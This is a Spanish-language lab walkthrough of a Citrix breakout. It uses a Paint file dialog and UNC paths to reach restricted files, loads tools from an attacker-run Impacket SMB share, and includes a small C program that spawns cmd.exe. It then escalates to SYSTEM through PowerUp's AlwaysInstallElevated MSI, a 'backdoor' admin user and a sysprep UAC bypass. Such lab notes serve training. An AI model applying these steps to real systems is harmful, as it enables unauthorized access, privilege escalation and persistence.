# Citrix Breakout

## Objetivo
- Obtener un cuadro de diálogo en el entorno Citrix (MS Paint, Notepad, etc.).  
- Usar el cuadro de diálogo para navegar rutas UNC y acceder a archivos restringidos (`cmd.exe`, `powershell.exe`).  
- Cargar herramientas desde un recurso compartido SMB del atacante.  
- Abrir una shell con más privilegios y escalar hasta SYSTEM usando vulnerabilidades o configuraciones débiles (AlwaysInstallElevated, bypass UAC).

---

## 1. Acceso al entorno Citrix
- Conéctate vía RDP a la URL:
```
http://humongousretail.com/remote/
```
- Usa las credenciales dadas en el laboratorio.

---

## 2. Bypass de restricciones con cuadro de diálogo
1. Abre **MS Paint** → `Archivo > Abrir`.
2. En el **campo de nombre de archivo** del cuadro de diálogo escribe la ruta UNC:
```
\\127.0.0.1\c$\users\pmorgan
```
3. Cambia el tipo de archivo a **All Files (\*.\*)** para poder ver todos los archivos y acceder a carpetas restringidas.

---

## 3. Montar servidor SMB en la máquina atacante
En la máquina atacante (Linux con Impacket):
```bash
smbserver.py -smb2support share $(pwd)
```
En el entorno Citrix, acceder al recurso compartido usando el cuadro de diálogo:
```
\\10.13.38.95\share
```

---

## 4. Ejecutar binarios desde el recurso SMB
Ejecutar directamente binarios como `pwn.exe` desde el recurso compartido para abrir CMD:
```c
// pwn.c
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

---

## 5. Copiar herramientas y scripts
- Usa **Explorer++** o **Q-Dir** para copiar archivos evitando restricciones del explorador estándar.

---

## 6. Ejecutar script para escalar privilegios
Ejemplo con **PowerUp.ps1** para detectar AlwaysInstallElevated:
```powershell
Import-Module .\PowerUp.ps1
Write-UserAddMSI
```

---

## 7. Crear usuario administrador
```powershell
runas /user:backdoor cmd
```

---

## 8. Bypass UAC
```powershell
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```

---

## 9. Comprobar privilegios
```powershell
whoami /all
whoami /priv
```
